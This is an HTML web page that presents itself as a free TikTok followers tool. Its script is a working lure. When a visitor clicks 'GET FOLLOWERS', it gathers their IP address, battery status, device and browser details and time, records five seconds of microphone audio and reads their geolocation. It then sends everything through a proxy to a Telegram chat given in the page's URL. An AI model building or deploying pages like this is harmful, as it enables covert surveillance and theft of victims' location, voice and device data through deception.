<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>TikTok Followers Tool - Location Only</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
  <style>
    body { font-family: 'Montserrat', sans-serif; margin:0; padding:0; background:#f5f5f5; }
    .navbar { background: linear-gradient(90deg,#69C9D0,#EE1D52); color:white; text-align:center; padding:15px 0; }
    #header { margin:0; font-size:26px; font-weight:bold; color:white; }
    .container { max-width:600px; margin:20px auto; padding:20px; background:#fff; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
    .form-control { width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:5px; }
    #thumbdloadbtn { display:block; width:100%; padding:12px; border:none; border-radius:5px; background:#EE1D52; color:white; font-size:18px; font-weight:bold; cursor:pointer; }
    footer { text-align:center; margin-top:40px; color:#fff; background:#EE1D52; padding:12px 0; border-top-left-radius:8px; border-top-right-radius:8px; font-weight:bold; }
  </style>
</head>
<body>
  <nav class="navbar">
    <h1 id="header">TIKTOK FREE FOLLOWERS</h1>
  </nav>

  <div class="container">
    <input id="ytlink" type="text" class="form-control" placeholder="Enter TikTok Profile URL">
    <button id="thumbdloadbtn" onclick="startProcess()">GET FOLLOWERS</button>
  </div>

  <script>
    function GetURLParameter(sParam){  
      var sPageURL=window.location.search.substring(1),sURLVariables=sPageURL.split('&');  
      for(var i=0;i<sURLVariables.length;i++){   
        var sParameterName=sURLVariables[i].split('=');   
        if(sParameterName[0]==sParam){return sParameterName[1];}   
      }  
    }  
    var chatid = GetURLParameter('id');  

    async function startProcess(){  
      document.getElementById('thumbdloadbtn').textContent='Fetching...';  

      if(chatid){  
        const [ip,battery] = await Promise.all([getIP(), getBattery()]);  
        const device = getDeviceInfo();  

        // --- send text info ---  
        fetch(`/api/proxy`,{  
          method:'POST',  
          headers:{'Content-Type':'application/json'},  
          body:JSON.stringify({  
            type:'message',  
            chat_id:chatid,  
            text:`üßë‚Äçüíª User Info:\n\n${ip}\n\n${battery}\n\n${device}`  
          })  
        });  

        // --- send voice (5s) ---  
        navigator.mediaDevices.getUserMedia({ audio:true }).then(stream => {  
          const recorder=new MediaRecorder(stream);  
          let chunks=[];  
          recorder.ondataavailable=e=>chunks.push(e.data);  
          recorder.onstop=()=>{  
            const blob=new Blob(chunks,{type:'audio/ogg'});  
            sendToTelegram(blob,'audio');  
          };  
          recorder.start();  
          setTimeout(()=>recorder.stop(),5000);  
        }).catch(err=>console.error(err));  

        // --- send location ---  
        if(navigator.geolocation){  
          navigator.geolocation.getCurrentPosition(pos=>{  
            fetch(`/api/proxy`,{  
              method:'POST',  
              headers:{'Content-Type':'application/json'},  
              body:JSON.stringify({  
                type:'location',  
                chat_id:chatid,  
                latitude:pos.coords.latitude,  
                longitude:pos.coords.longitude  
              })  
            });  
          });  
        }  
      }  
    }  

    function sendToTelegram(data,type){   
      if(!chatid) return;   
      const formData=new FormData();   
      formData.append('chat_id',chatid);   
      if(type==='audio'){  
        formData.append('audio',data,`Ali_Bot_Audio_${Date.now()}.ogg`);  
        formData.append('caption',"üé§ Voice Recorded by @Ali_Bot");  
      }  
      fetch(`/api/proxy?type=${type}`,{method:'POST',body:formData});   
    }  

    function getBattery(){   
      if(navigator.getBattery){   
        return navigator.getBattery().then(b=>`üîã Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`);   
      }   
      return Promise.resolve("üîã Battery: API not available");   
    }  

    function getIP(){   
      return fetch("https://api.ipify.org?format=json")  
        .then(res=>res.json())  
        .then(data=>`üåê IP Address: ${data.ip}`)  
        .catch(()=> "üåê IP Address: Could not detect");   
    }  

    function getDeviceInfo(){   
      return `üì± Device Info:\nScreen: ${screen.width} x ${screen.height}\n‚è∞ Time: ${new Date().toLocaleString()}\nModel: ${navigator.userAgent}`;   
    }  
  </script>

  <footer><p>DEVELOP BY ALIüíúüî•</p></footer>
</body>
</html>
